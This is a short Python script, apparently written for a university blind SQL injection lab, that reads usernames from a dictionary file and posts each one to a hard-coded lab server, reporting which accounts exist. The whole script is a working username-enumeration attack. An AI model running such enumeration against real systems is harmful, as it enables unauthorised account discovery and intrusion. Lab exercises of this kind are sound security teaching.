#! /usr/bin/env python
"""
This program uses a dictionary file to check common usernames with access
"""

__author__="Aaron Castro"
__author_email__="aaron.castro.sanchez@outlook.com"
__copyright__="Aaron Castro"
__license__="MIT"

import requests, re

req=requests.session()
url='http://84.88.58.172/UOC/Alumnos/blindsqlinjection/'

def remove_html(html):
    clean=re.compile('<.*?>')
    return re.sub(clean, '', html)

def look_for_exitcode(html):
    if re.search('si tiene acceso', html):
        return(True)
    else:
        return(False)

if __name__=="__main__":
    with open('usuarios.txt') as file:
        lines=file.readlines()

    for line in lines: 
        payload={'usuario': line.strip()}
        r=requests.post(url, data=payload)
        if look_for_exitcode(remove_html(r.text))==True:
            print('User ' + line.strip() + ' exists')